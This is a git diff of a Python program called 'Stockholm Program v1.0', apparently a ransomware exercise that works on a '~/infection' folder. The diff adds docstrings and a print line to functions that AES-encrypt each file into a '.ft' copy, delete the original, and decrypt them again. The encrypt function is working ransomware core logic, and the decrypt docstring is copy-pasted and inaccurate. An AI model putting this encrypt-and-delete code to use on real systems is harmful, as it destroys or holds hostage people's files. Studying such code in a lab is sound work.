@@ -7,18 +7,36 @@ from Crypto.Util.Padding import pad, unpad
 VERSION = "Stockholm Program v1.0"
 INFECTION_DIR = os.path.expanduser("~/infection")
 
+
+'''
+    encrypt : encryptes the data of a file and writes it on a new file + .ft
+        @PARAM key takes the randomly generated key for each file
+        @PARAM filename is the file being encrypting with file PATH
+    the new generated file will contain a .ft ext and the key+data (usually typicall Malware)
+    when its done it will delete the original file leaving the encrypted file only
+'''
+
 def encrypt(key, filename):
     try:
         cipher = AES.new(key, AES.MODE_CBC)
         with open(filename, "rb") as f:
             data = f.read()
         encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+        print(f"generating encrypted file for {filename}")
         with open(filename + ".ft", "wb") as f:
-            f.write(cipher.iv + encrypted_data)  # No newline!
+            f.write(cipher.iv + encrypted_data)
         os.remove(filename)
     except Exception as e:
         print(f"error while encrypting {e}")
 
+
+'''
+    decrypt : fetches all ft files and and will reverse the infection
+        @PARAM the key generated first time when the encryption is running
+        @PARAM filename + PATH of each file to be decrypted
+    the new generated file will ext and the key+data (usually typicall Malware)
+    when its done it will delete the original file leaving the encrypted file only
+'''
 
 def decrypt(key, filename):
     print(f"[...] begin decrypting {filename}")
@@ -28,7 +46,6 @@ def decrypt(key, filename):
             data = f.read()
         cipher = AES.new(key, AES.MODE_CBC, iv)
         plaintext = unpad(cipher.decrypt(data), AES.block_size)
-
         name = filename.replace(".ft", "")
         with open(name, "wb") as f:
             f.write(plaintext)
